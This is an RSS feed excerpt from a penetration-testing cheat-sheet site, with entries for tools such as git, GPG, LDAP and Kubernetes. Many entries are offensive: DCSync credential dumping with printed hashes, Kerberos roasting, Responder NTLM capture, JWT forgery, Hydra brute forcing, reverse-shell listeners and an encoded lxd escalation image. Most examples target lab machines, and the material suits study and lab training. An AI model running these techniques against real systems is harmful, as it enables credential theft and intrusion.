      <title>GetChanges/GetChangesAll</title>
      <link>https://tldrbins.github.io/getchanges_getchangesall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/getchanges_getchangesall/</guid>
      <description>Abuse #1: DCSync Attack Linux Windows # With creds impacket-secretsdump -just-dc &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump -just-dc &amp;#39;mrlky:Football#7@10.10.10.103&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: ...[SNIP]... [*] Cleaning up... # With hashes impacket-secretsdump -hashes :&amp;lt;HASH&amp;gt; -just-dc &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; $ impacket-secretsdump -hashes :bceef4f6fe9c026d1d8dec8dce48adef -just-dc &amp;#39;sizzle.htb/mrlky@10.10.10.103&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.</description>
    </item>
    <item>
      <title>git</title>
      <link>https://tldrbins.github.io/git/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/git/</guid>
      <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;lt;BRANCH_NAME&amp;gt; --oneline # Show diff, a and b are commit hash # a is the older commit git diff &amp;lt;A_COMMIT_HASH&amp;gt; &amp;lt;B_COMMIT_HASH&amp;gt; # Show commit git show &amp;lt;COMMIT_HASH&amp;gt; Git Tools git-dumper git-bundle git-dumper &amp;lt;TARGET&amp;gt; result/ Ref: git-dumper</description>
    </item>
    <item>
      <title>GPG</title>
      <link>https://tldrbins.github.io/gpg/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/gpg/</guid>
      <description>GPG # Check version gpg --version # Generate new key gpg --gen-key # Export public key gpg --export -a &amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt; # Check keys gpg --list-keys # Import public key gpg --import &amp;lt;PUB_KEY&amp;gt; # Encrypt a message with public key (email from pub key) gpg --encrypt --armor -r &amp;lt;USER&amp;gt;@&amp;lt;DOMAIN&amp;gt; &amp;lt;FILE&amp;gt; # Decrypt a message with our private key gpg -d &amp;lt;ENC_FILE&amp;gt; # Sign our own message gpg --clearsign --output - &amp;lt;FILE&amp;gt; </description>
    </item>
    <item>
      <title>GPOs</title>
      <link>https://tldrbins.github.io/gpos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/gpos/</guid>
      <description>General 1. Install GPMC [Optional] # Runas Administrator Install-WindowsFeature GPMC PS C:\Windows\system32&amp;gt; Install-WindowsFeature GPMC Install-WindowsFeature GPMC Success Restart Needed Exit Code Feature Result ------- -------------- --------- -------------- True No Success {Group Policy Management} 2. List GPOs Name # List all GPOs Get-GPO -All | Select-Object DisplayName *Evil-WinRM* PS C:\Users\HHogan\Documents&amp;gt; Get-GPO -All | Select-Object DisplayName DisplayName ----------- Windows Firewall GPO Default Domain Policy Default Active Directory Settings GPO Default Domain Controllers Policy Windows Update GPO Windows Update Domain Policy Software Installation GPO Password Policy GPO # Check GPO by name Get-GPO -Name &amp;#39;&amp;lt;GPO_NAME&amp;gt;&amp;#39; # Generate XML report Get-GPOReport -Name &amp;#39;&amp;lt;GPO_NAME&amp;gt;&amp;#39; -ReportType XML # Generate pretty HTML report Get-GPOReport -Name &amp;#39;&amp;lt;GPO_NAME&amp;gt;&amp;#39; -ReportType HTML -Path &amp;#34;C:\ProgramData\GPOReport.</description>
    </item>
    <item>
      <title>Graphql</title>
      <link>https://tldrbins.github.io/graphql/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/graphql/</guid>
      <description>Visualize Tool +---------------------------------------------------------------+ | 1. Change Schema -&amp;gt; Introspection -&amp;gt; Copy Introspection Query | | 2. Paste query | | 3. Display | +---------------------------------------------------------------+ Ref: graphql-voyager&#xA;Basic Commands # Get fields from schema curl -s &amp;lt;TARGET&amp;gt;:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{queryType{name,fields{name,description}}}}&amp;#34;}&amp;#39; | jq . # Get types name curl -s &amp;lt;TARGET&amp;gt;:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__schema{types{name}}}&amp;#34;}&amp;#39; | jq . # Get fields of type (e.g. User) curl -s &amp;lt;TARGET&amp;gt;:3000/graphql -H &amp;#34;Content-Type: application/json&amp;#34; -d &amp;#39;{&amp;#34;query&amp;#34;:&amp;#34;{__type(name:\&amp;#34;User\&amp;#34;){name,fields{name}}}&amp;#34;}&amp;#39; | jq .</description>
    </item>
    <item>
      <title>Grep</title>
      <link>https://tldrbins.github.io/grep/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/grep/</guid>
      <description>Basic grep &amp;#39;&amp;lt;STRING&amp;gt;&amp;#39; &amp;lt;FILE&amp;gt; Grep from files recursively (e.g from current directory) grep -rni &amp;#39;&amp;lt;STRING&amp;gt;&amp;#39; . Grep from binary grep -a &amp;#39;&amp;lt;STRING&amp;gt;&amp;#39; &amp;lt;FILE&amp;gt; Grep hash from binary with perl regex grep -aPo &amp;#39;[a-fA-F0-9]{32}&amp;#39; &amp;lt;FILE&amp;gt; Grep from binaries recusively (e.g. from /var/log) sudo grep -rHa &amp;#34;&amp;lt;STRING&amp;gt;&amp;#34; /var/log Find unique char of a file cat &amp;lt;FILE&amp;gt; | od -cvA none -w1 | sort -bu | tr -d &amp;#39;\n&amp;#39; | tr -d &amp;#39; &amp;#39; </description>
    </item>
    <item>
      <title>Hydra</title>
      <link>https://tldrbins.github.io/hydra/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/hydra/</guid>
      <description>HTTP basic auth hydra -L &amp;lt;USERS_FILE&amp;gt; -P &amp;lt;PASSWORD_FILE&amp;gt; -s &amp;lt;TARGET_PORT&amp;gt; -f &amp;lt;TARGET&amp;gt; http-get / +-------------------------------------------+ | -s : port | | -L : usernames file | | -P : passwords file | | -f : exit when a login/pass pair is found | +-------------------------------------------+ Web Page Login Form hydra &amp;lt;TARGET&amp;gt; -l &amp;lt;USER&amp;gt; -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form &amp;#39;/login.php:username=admin&amp;amp;password=^PASS^&amp;amp;remember=yes:Incorrect password&amp;#39; +-------------------------------------------+ | -l : username | | -P : wordlist | | http-post-form : service | | /login.</description>
    </item>
    <item>
      <title>IIS</title>
      <link>https://tldrbins.github.io/iis/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/iis/</guid>
      <description>IIS Version +---------------------------------------------------------------------------------+ | Version Start Date End Date | +---------------------------------------------------------------------------------+ | IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | | IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | | IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027 | | IIS 10 on Windows 10 Pro Jul 29, 2015 | | IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | | IIS 8.</description>
    </item>
    <item>
      <title>IMAP</title>
      <link>https://tldrbins.github.io/imap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/imap/</guid>
      <description>IMAP/IMAPS # Connect to IMAP over ssl rlwrap openssl s_client -connect &amp;lt;TARGET&amp;gt;:993 $ rlwrap openssl s_client -connect 10.10.10.197:993 Connecting to 10.10.10.197 CONNECTED(00000003) Can&amp;#39;t use SSL_get_servername depth=0 CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US verify error:num=18:self-signed certificate verify return:1 depth=0 CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US verify error:num=10:certificate has expired notAfter=May 14 17:14:21 2021 GMT verify return:1 depth=0 CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US notAfter=May 14 17:14:21 2021 GMT verify return:1 --- Certificate chain 0 s:CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US i:CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US a:PKEY: rsaEncryption, 3072 (bit); sigalg: RSA-SHA256 v:NotBefore: May 14 17:14:21 2020 GMT; NotAfter: May 14 17:14:21 2021 GMT --- Server certificate -----BEGIN CERTIFICATE----- MIIE6zCCA1OgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBjjESMBAGA1UEAxMJbG9j YWxob3N0MS0wKwYDVQQLEyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBJTUFQIFNT TCBrZXkxHDAaBgNVBAoTE0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5l dyBZb3JrMQswCQYDVQQIEwJOWTELMAkGA1UEBhMCVVMwHhcNMjAwNTE0MTcxNDIx WhcNMjEwNTE0MTcxNDIxWjCBjjESMBAGA1UEAxMJbG9jYWxob3N0MS0wKwYDVQQL EyRBdXRvbWF0aWNhbGx5LWdlbmVyYXRlZCBJTUFQIFNTTCBrZXkxHDAaBgNVBAoT E0NvdXJpZXIgTWFpbCBTZXJ2ZXIxETAPBgNVBAcTCE5ldyBZb3JrMQswCQYDVQQI EwJOWTELMAkGA1UEBhMCVVMwggGiMA0GCSqGSIb3DQEBAQUAA4IBjwAwggGKAoIB gQDCzBP4iuxxLmXPkmi5jABQrywLJK0meyW49umfYhqayBH7qtuIjyAmznnyDIR0 543qHgWAfSvGHLFDB9B1wnkvAU3aprjURn1956X/4jEi9xmhRwvum5T+vp3TT96d JgW9SSLiPFQty5eVrKuQvg1bZg/Vjp7CUUQ0+7PmdylMOipohls5RDEppCDGFmiS HN0ZayXpjd/kwqZ/O9uTJGHOzagY+ruTYAx3tanO4oDwdrz9FPr3S2KNPTjjtzqf CPdcsi+6JTQJI03eMEftBKo3HZTp7Hx6FObZcvcNskTLqtsYZYuzHS7KQwiuTAJ5 d/ZKowCeJDaVlS35tQleisu+pJCkwcStpM1BJ51UQRZ5IpvItTfnrChEa1uyTlAy ZIOQK2/+34K2ZrldYWyfKlYHxieGZgzQXLo/vyW/1gqzXy7KHx+Uuf4CAzzOP1p3 8QNmvsqkJrQMuH3XPXLswr9A1gPe7KTLEGNRJSxcGF1Q25m4e04HhZzK76KlBfVt IJ0CAwEAAaNSMFAwDAYDVR0TAQH/BAIwADAhBgNVHREEGjAYgRZwb3N0bWFzdGVy QGV4YW1wbGUuY29tMB0GA1UdDgQWBBTylxdM/AHlToKxNvmnPdXJCjjbnDANBgkq hkiG9w0BAQsFAAOCAYEAAo7NqfYlXSEC8q3JXvI5EeVpkgBDOwnjxuC/P5ziEU0c PRx6L3w+MxuYJdndC0hT9FexXzSgtps9Xm+TE81LgNvuipZ9bulF5pMmmO579U2Y suJJpORD4P+65ezkfWDbPbdKyHMeRvVCkZCH74z2rCu+OeQTGb6GLfaaB7v9dThR rfvHwM50hxNb4Zb4of7Eyw2OJGeeohoG4mFT4v7cu1WwimsDF/A7OCVOmvvFWeRA EjdEReekDJsBFpHa8uRjxZ+4Ch9YvbFlYtYi6VyXV1AFR1Mb91w+iIitc6ROzjJ2 pVO69ePygQcjBRUTDX5reuBzaF5p9/6Ta9HP8NDI9+gdw6VGVTmYRJUbj7OeKSUq FWUmtZYC288ErDAZ7z+6VqJtZsPXIItZ8J6UZE3zBclGMcQ7peL9wEvJQ8oSaHHM AmgHIoMwKXSNEkHbBD24cf9KwVhcyJ4QCrSJBMAys98X6TzCwQI4Hy7XyifU3x/L XUFD0JSVQp4Rmcg5Uzuk -----END CERTIFICATE----- subject=CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US issuer=CN=localhost, OU=Automatically-generated IMAP SSL key, O=Courier Mail Server, L=New York, ST=NY, C=US --- No client certificate CA names sent Peer signing digest: SHA256 Peer signature type: RSA-PSS Server Temp Key: X25519, 253 bits --- SSL handshake has read 1947 bytes and written 518 bytes Verification error: certificate has expired --- New, TLSv1.</description>
    </item>
    <item>
      <title>IRC</title>
      <link>https://tldrbins.github.io/irc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/irc/</guid>
      <description>IRC Tools hexchat sudo apt install hexchat </description>
    </item>
    <item>
      <title>Java</title>
      <link>https://tldrbins.github.io/java/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/java/</guid>
      <description>Java Decompile JAR jd-gui Ref: Download jd-gui&#xA;Compile # Compile javac src/program.java # Pack into jar jar -cvf program.jar -C src/ . </description>
    </item>
    <item>
      <title>Java Environment</title>
      <link>https://tldrbins.github.io/java_envionment/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/java_envionment/</guid>
      <description>Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac </description>
    </item>
    <item>
      <title>Joomla</title>
      <link>https://tldrbins.github.io/joomla/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/joomla/</guid>
      <description>Check Version curl -s &amp;lt;TARGET&amp;gt;/administrator/manifests/files/joomla.xml | head Admin Panel curl -s &amp;lt;TARGET&amp;gt;/administrator </description>
    </item>
    <item>
      <title>JWT</title>
      <link>https://tldrbins.github.io/jwt/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/jwt/</guid>
      <description>Abuse #1: Algorithm confusion 0. Sample jwks.json { &amp;#34;keys&amp;#34;: [ { &amp;#34;kty&amp;#34;: &amp;#34;RSA&amp;#34;, &amp;#34;use&amp;#34;: &amp;#34;sig&amp;#34;, &amp;#34;alg&amp;#34;: &amp;#34;RS256&amp;#34;, &amp;#34;n&amp;#34;: &amp;#34;&amp;lt;BASE64_n&amp;gt;&amp;#34;, &amp;#34;e&amp;#34;: &amp;#34;AQAB&amp;#34; } ] } 1. Create a public key # Invoking python interpreter python3 from base64 import urlsafe_b64decode from Crypto.PublicKey import RSA e = int.from_bytes(urlsafe_b64decode(b&amp;#39;AQAB&amp;#39;)) n = int.from_bytes(urlsafe_b64decode(b&amp;#39;&amp;lt;BASE64_N&amp;gt;&amp;#39;)) key = RSA.construct((n, e)) # Save it to public.pem print(key.exportKey().decode()) 2. Forge a jwt # For example, modify role to admin python3 jwt_tool.</description>
    </item>
    <item>
      <title>Keepass</title>
      <link>https://tldrbins.github.io/keepass/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/keepass/</guid>
      <description>Master password cracking keepass2john &amp;lt;KDBX_FILE&amp;gt; &amp;gt; hash # With a key file keepass2john -k &amp;lt;KEY_FILE&amp;gt; &amp;lt;KDBX_FILE&amp;gt; &amp;gt; hash kpcli # Open kdbx kpcli --kdb &amp;lt;KDBX_FILE&amp;gt; # Open kdbx with a key file kpcli --key &amp;lt;KEY_FILE&amp;gt; --kdb &amp;lt;KDBX_FILE&amp;gt; # List all passwords find . # Show password (e.g. #0) show -f 0 # Export attachment (e.g. #0) attach 0 Ref: Download kpcli</description>
    </item>
    <item>
      <title>Kerberoasting</title>
      <link>https://tldrbins.github.io/roasting/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/roasting/</guid>
      <description>AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers &amp;lt;DOMAIN&amp;gt;/ -usersfile &amp;lt;USERS_FILE&amp;gt; -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; $ impacket-GetNPUsers ABSOLUTE.HTB/ -usersfile valid_usernames.txt -no-pass -dc-ip DC.ABSOLUTE.HTB Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [-] User j.roberts doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User m.chaffrey doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User s.osvald doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$23$d.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea$7288c91ca ...[SNIP]... 0e09c5d9d1 [-] User j.robinson doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set [-] User n.smith doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set # Single user without creds impacket-GetNPUsers -no-pass -dc-ip &amp;lt;DC_IP&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; $ impacket-GetNPUsers -no-pass -dc-ip 10.</description>
    </item>
    <item>
      <title>Kerberos</title>
      <link>https://tldrbins.github.io/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/kerberos/</guid>
      <description>Usernames enum kerbrute metasploit kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; &amp;lt;USERNAMES_FILE&amp;gt; $ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,&amp;lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop 2024/09/24 14:54:41 &amp;gt; Using KDC(s): 2024/09/24 14:54:41 &amp;gt; dc.</description>
    </item>
    <item>
      <title>Krbrelayx</title>
      <link>https://tldrbins.github.io/krbrelayx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/krbrelayx/</guid>
      <description>Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 $ sudo responder -I tun0 ...[SNIP]... [+] Listening for events... [HTTP] NTLMv2 Client : 10.10.10.248 [HTTP] NTLMv2 Username : intelligence\Ted.Graves [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:d7c67a8c74862137:0A35D20EE3FBA610230D28C48721B56D:0101000000000000D65AF86515DDDA0199DC5CF792F34BB30000000002000800570055004700590001001E00570049004E002D00550047004C00500034004900410052003400540037000400140057005500470059002E004C004F00430041004C0003003400570049004E002D00550047004C00500034004900410052003400540037002E0057005500470059002E004C004F00430041004C000500140057005500470059002E004C004F00430041004C0008003000300000000000000000000000002000001FD76CFFA06B9CF7377C55FA66233020F8C5D26492A52A529BE0B598DC7BB06D0A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D0074006500730074002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 python3 dnstool.py -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --action add --record &amp;lt;TARGET_RECORD&amp;gt; --data &amp;lt;LOCAL_IP&amp;gt; &amp;lt;TARGET_IP&amp;gt; $ python3 dnstool.py -u &amp;#39;intelligence\Tiffany.Molina&amp;#39; -p &amp;#39;NewIntelligenceCorpUser9876&amp;#39; --action add --record web-test --data 10.10.14.31 10.</description>
    </item>
    <item>
      <title>Kubelet</title>
      <link>https://tldrbins.github.io/kubelet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/kubelet/</guid>
      <description>Basic Commands # List all the pods on the node kubeletctl pods -s &amp;lt;TARGET&amp;gt; # List running pods kubeletctl runningpods -s &amp;lt;TARGET&amp;gt; # Exec command kubeletctl exec &amp;#34;/bin/bash&amp;#34; -p &amp;lt;POD_NAME&amp;gt; -c &amp;lt;CONTAINER_NAME&amp;gt; -s &amp;lt;TARGET&amp;gt; Ref: kubeletctl</description>
    </item>
    <item>
      <title>Kubernetes</title>
      <link>https://tldrbins.github.io/kubernetes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/kubernetes/</guid>
      <description>Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Basic Commands # List all namespaces kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; get namespaces # Get user permissions in current namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; auth can-i --list # Get user permissions in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; auth can-i --list -n &amp;lt;NAMESPACE&amp;gt; # List all pods kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.crt --server &amp;lt;TARGET&amp;gt; get pods --all-namespaces # List pods in specific namespace kubectl --token &amp;lt;TOKEN&amp;gt; --certificate-authority ca.</description>
    </item>
    <item>
      <title>LDAP</title>
      <link>https://tldrbins.github.io/ldap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ldap/</guid>
      <description>Enum ldapsearch ldapdomaindump nmap # Get domain base ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds ldapsearch -x -H ldap://&amp;lt;TARGET&amp;gt; -D &amp;#34;CN=&amp;lt;USER&amp;gt;,CN=Users,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#34; -w &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # With creds ldapdomaindump -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -o ./ldap # Using nmap script sudo nmap -p 389 --script ldap-search &amp;lt;TARGET&amp;gt; Enum with Kerberos ldapsearch nxc # Add GSSAPI sudo apt install libsasl2-modules-gssapi-mit ldapsearch -H ldap://&amp;lt;TARGET&amp;gt; -Y GSSAPI -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # With kerberos nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --users </description>
    </item>
    <item>
      <title>Linux hard disk encryption</title>
      <link>https://tldrbins.github.io/linux_hard_disk_encryption_luks/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/linux_hard_disk_encryption_luks/</guid>
      <description>Brute force LUKS password bruteforce-luks -t 10 -f &amp;lt;WORDLIST&amp;gt; -w state.txt -v 30 &amp;lt;BACKUP_IMG&amp;gt; Note: This is slow, create a small wordlist&#xA;Basic # Open cryptsetup open --type luks &amp;lt;BACKUP_IMG&amp;gt; backup # Check ls -l /dev/mapper/ # Create mount folder sudo mkdir /mnt/backup # Mount sudo mount /dev/mapper/backup /mnt/backup/ </description>
    </item>
    <item>
      <title>Listeners</title>
      <link>https://tldrbins.github.io/listeners/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/listeners/</guid>
      <description>Listener Tools nc ncat pwncat rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap nc -lvnp 1337 listening on [any] 1337 ... # Default listening on both ipv4 and ipv6 rlwrap ncat -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap ncat -lvnp 1337 Ncat: Version 7.94SVN ( https://nmap.org/ncat ) Ncat: Listening on [::]:1337 Ncat: Listening on 0.0.0.0:1337 pwncat-cs -lp &amp;lt;LOCAL_PORT&amp;gt; # After getting a connection back $ pwncat-cs -lp 1337 [11:43:14] Welcome to pwncat 🐈! __main__.py:164 [11:43:25] received connection from 10.</description>
    </item>
    <item>
      <title>lxd</title>
      <link>https://tldrbins.github.io/lxd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/lxd/</guid>
      <description>Basic Commands # Check if user in lxd group id orestis@brainfuck:~$ id uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare) # List containers lxc list orestis@brainfuck:~$ lxc list Generating a client certificate. This may take a minute... If this is your first time using LXD, you should also run: sudo lxd init To start your first container, try: lxc launch ubuntu:16.04 +------+-------+------+------+------+-----------+ | NAME | STATE | IPV4 | IPV6 | TYPE | SNAPSHOTS | +------+-------+------+------+------+-----------+ # List images lxc image list orestis@brainfuck:~$ lxc image list +-------+-------------+--------+-------------+------+------+-------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE | +-------+-------------+--------+-------------+------+------+-------------+ Abuse #1: Mount host&amp;rsquo;s file system # Upload a 656 bytes conatiner image echo QlpoOTFBWSZTWaxzK54ABPR/p86QAEBoA//QAA3voP/v3+AACAAEgACQAIAIQAK8KAKCGURPUPJGRp6gNAAAAGgeoA5gE0wCZDAAEwTAAADmATTAJkMAATBMAAAEiIIEp5CepmQmSNNqeoafqZTxQ00HtU9EC9/dr7/586W+tl+zW5or5/vSkzToXUxptsDiZIE17U20gexCSAp1Z9b9+MnY7TS1KUmZjspN0MQ23dsPcIFWwEtQMbTa3JGLHE0olggWQgXSgTSQoSEHl4PZ7N0+FtnTigWSAWkA+WPkw40ggZVvYfaxI3IgBhip9pfFZV5Lm4lCBExydrO+DGwFGsZbYRdsmZxwDUTdlla0y27s5Euzp+Ec4hAt+2AQL58OHZEcPFHieKvHnfyU/EEC07m9ka56FyQh/LsrzVNsIkYLvayQzNAnigX0venhCMc9XRpFEVYJ0wRpKrjabiC9ZAiXaHObAY6oBiFdpBlggUJVMLNKLRQpDoGDIwfle01yQqWxwrKE5aMWOglhlUQQUit6VogV2cD01i0xysiYbzerOUWyrpCAvE41pCFYVoRPj/B28wSZUy/TaUHYx9GkfEYg9mcAilQ+nPCBfgZ5fl3GuPmfUOB3sbFm6/bRA0nXChku7aaN+AueYzqhKOKiBPjLlAAvxBAjAmSJWD5AqhLv/fWja66s7omu/ZTHcC24QJ83NrM67KACLACNUcnJjTTHCCDUIUJtOtN+7rQL+kCm4+U9Wj19YXFhxaXVt6Ph1ALRKOV9Xb7Sm68oF7nhyvegWjELKFH3XiWstVNGgTQTWoCjDnpXh9+/JXxIg4i8mvNobXGIXbmrGeOvXE8pou6wdqSD/F3JFOFCQrHMrng= | base64 -d &amp;gt; test.</description>
    </item>
    <item>
      <title>Machine Account</title>
      <link>https://tldrbins.github.io/machine_account/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/machine_account/</guid>
      <description>Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt PS C:\programdata&amp;gt; .\rubeus.exe tgtdeleg /nowrap /ptt ______ _ (_____ \ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \| ___ | | | |/___) | | \ \| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.3.2 [*] Action: Request Fake Delegation TGT (current user) [*] No target SPN specified, attempting to build &amp;#39;cifs/dc.</description>
    </item>
    <item>
      <title>Magic Bytes</title>
      <link>https://tldrbins.github.io/magic_bytes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
